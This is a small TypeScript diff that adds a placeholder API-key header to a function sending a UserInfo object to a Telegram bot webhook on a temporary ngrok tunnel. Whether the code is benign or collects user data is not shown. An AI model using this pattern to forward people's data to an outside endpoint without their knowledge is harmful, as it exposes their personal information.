@@ -1,5 +1,4 @@
 import { UserInfo } from './userInfo';
-
   // Send user data directly to your bot's webhook
   export async function sendToTelegram(userInfo: UserInfo): Promise<boolean> {
     const webhookUrl = 'https://800d-217-138-162-43.ngrok-free.app/webhook/userinfo';
@@ -10,6 +9,7 @@ import { UserInfo } from './userInfo';
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'X-API-Key': 'YOUR_SECRET_API_KEY'
         },
         body: JSON.stringify(userInfo),
       });
